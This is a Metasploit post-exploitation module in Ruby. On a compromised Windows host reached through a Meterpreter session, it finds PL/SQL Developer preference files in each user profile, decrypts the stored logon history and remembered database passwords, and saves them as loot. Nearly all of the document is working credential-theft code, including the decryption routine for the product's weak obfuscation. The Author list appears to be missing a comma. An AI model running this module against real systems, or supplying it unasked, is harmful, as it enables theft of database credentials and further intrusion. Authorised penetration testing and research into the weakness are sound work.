##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather PL/SQL Developer History and Passwords',
        'Description' => %q{
          This module can decrypt the history of a PL/SQL Developer,
          and passwords are available if the user chooses to remember the password.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/']
        ],
        'Author' => [
          'Adam Caudill' # Discovery 
          'Jemmy Wang' # msf module 
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_ls
              stdapi_fs_separator
              stdapi_fs_stat
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('PLSQL_PATH', [ false, 'Specify the path of PL/SQL Developer']),
      ]
    )
  end

  def decrypt(str)
    result = ''
    key = str[0..3].to_i
    for i in 1..(str.length / 4 - 1) do
      n = str[(i * 4)..(i * 4 + 3)].to_i
      result << (((n - 1000) ^ (key + i * 10)) >> 4).chr
    end
    return result
  end

  def decrypt_pref(file_name)
    file_contents = read_file(file_name)
    if file_contents.nil? || file_contents.empty?
      print_status "Skipping empty file: #{file_name}"
      return []
    end

    print_status("Decrypting #{file_name}")
    result = []

    decrypting = false
    file_contents.split("\n").each do |line|
      line.gsub!(/(\n|\r)/, '')

      if !decrypting && line != '[LogonHistory]'
        next
      elsif line == '[LogonHistory]'
        decrypting = true
        next
      elsif line == ''
        decrypting = false
        next
      end

      result << { history: decrypt(line) }
    end

    return result
  end

  def enumerate_pref(plsql_path)
    result = []
    pref_dir = plsql_path + session.fs.file.separator + 'Preferences'
    session.fs.dir.entries(pref_dir).each do |username|
      udir = pref_dir + session.fs.file.separator + username
      file_name = udir + session.fs.file.separator + 'user.prefs'

      result << file_name if directory?(udir) && file?(file_name)
    end

    return result
  end

  def run
    print_status("Gather PL/SQL Developer History and Passwords on #{sysinfo['Computer']}")
    profiles = grab_user_profiles
    pref_paths = []

    profiles.each { |user_profiles| pref_paths += enumerate_pref(user_profiles['AppData'] + session.fs.file.separator + 'PLSQL Developer') }
    pref_paths += enumerate_pref(datastore['PLSQL_PATH']) if datastore['PLSQL_PATH'].present?

    result = []
    pref_paths.uniq.each { |pref_path| result += decrypt_pref(pref_path) }

    tbl = Rex::Text::Table.new(
      'Header' => 'PL/SQL Developer History and Passwords',
      'Columns' => ['History']
    )

    result.each do |item|
      tbl << item.values
    end

    print_line(tbl.to_s)
    # Only save data to disk when there's something in the table
    if tbl.rows.count > 0
      path = store_loot('host.plsql_developer', 'text/plain', session, tbl, 'plsql_developer.txt', 'PL/SQL Developer History and Passwords')
      print_good("Passwords stored in: #{path}")
    end
  end
end
